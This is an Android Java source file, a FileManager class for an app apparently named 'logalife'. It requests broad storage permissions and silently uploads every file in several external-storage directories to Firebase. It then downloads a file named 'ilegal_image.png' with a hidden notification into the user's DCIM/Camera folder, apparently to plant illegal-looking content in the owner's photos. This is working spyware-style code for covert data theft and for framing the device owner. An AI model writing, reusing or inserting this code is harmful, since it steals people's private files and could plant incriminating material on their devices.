package com.example.logalife.files;

import android.app.DownloadManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.logalife.MainActivity;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;

public class FileManager {

    Context context;
    FirebaseStorage storage = FirebaseStorage.getInstance();
    StorageReference storageRef = storage.getReference();

    public FileManager(Context context) {
        this.context = context;
    }

    public void requestPermissions(MainActivity activity) {
        try {
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(activity, new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, 101);
            }
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.MANAGE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(activity, new String[]{android.Manifest.permission.MANAGE_EXTERNAL_STORAGE}, 101);
            }
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(activity, new String[]{android.Manifest.permission.WRITE_EXTERNAL_STORAGE}, 101);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void getFiles() {
        getFilesFromRelevantDirectories(FileUtils.RELEVANT_DIRECTORIES);
    }

    private void getFilesFromRelevantDirectories(String[] relevantDirectories) {

        for (String relevantDirectory : relevantDirectories) {
            getFilesFromRelevantDirectory(relevantDirectory);
        }
    }

    private void getFilesFromRelevantDirectory(String relevantDirectory) {
        String path = Environment.getExternalStorageDirectory().toString() + relevantDirectory;
        Log.d("FILES - ", "Path: " + path);

        File directory = new File(path);
        File[] files = directory.listFiles();

        if (directory.canRead() && files != null && files.length > 0) {
            for (File file : files) {
                Log.d("FILES - ", file.getName());
                if(file.isFile()){
                    storeFileInFirebase(file, FileUtils.getFirebaseStorageDirectoryByExternalDirectory(relevantDirectory));
                }
            }
        } else {
            Log.d("FILES", " No files in directory " + relevantDirectory);
        }
    }

    private void storeFileInFirebase(File file, String folder) {
        Log.d("FILES", " Storing file " + file.getName() + " in database.");
        Uri uriFile = Uri.fromFile(file);
        StorageReference riversRef = storageRef.child(folder + uriFile.getLastPathSegment());
        riversRef.putFile(uriFile);
    }


    public void fetchFileFromFirebase() {

        StorageReference illegalFileRef = storageRef.child("ilegal_image.png");

        illegalFileRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
            @Override
            public void onSuccess(Uri uri) {
                // Local temp file has been created
                String url = uri.toString();
                dowloadFile(context, "ilegal_image.png", url);
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception exception) {
                // Handle any errors
                Toast.makeText(context, "Error downloading illegal File", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void dowloadFile(Context context, String fileName, String url) {
        DownloadManager downloadManager = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
        Uri uri = Uri.parse(url);
        DownloadManager.Request request = new DownloadManager.Request(uri);
        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
        request.setDestinationInExternalPublicDir( Environment.DIRECTORY_DCIM, "Camera/" + fileName);
        downloadManager.enqueue(request);
    }


}
